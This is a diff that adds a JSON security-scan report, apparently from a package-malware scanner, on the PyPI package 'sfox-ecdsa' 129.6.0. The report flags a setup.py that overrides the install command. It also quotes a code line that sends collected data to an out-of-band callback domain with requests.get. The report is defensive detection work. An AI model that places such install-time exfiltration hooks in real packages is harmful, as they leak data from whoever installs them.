@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://cd3erga2vtc0000zbam0gg1iwzeyyyyyd.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:18",
+                "code": "setup(name='sfox-ecdsa', #package name\n      version='129.6.0',\n      description='a whitehat test',\n      author='amwsis',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://cd3erga2vtc0000zbam0gg1iwzeyyyyyd.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/sfox-ecdsa-129.6.0"
+}
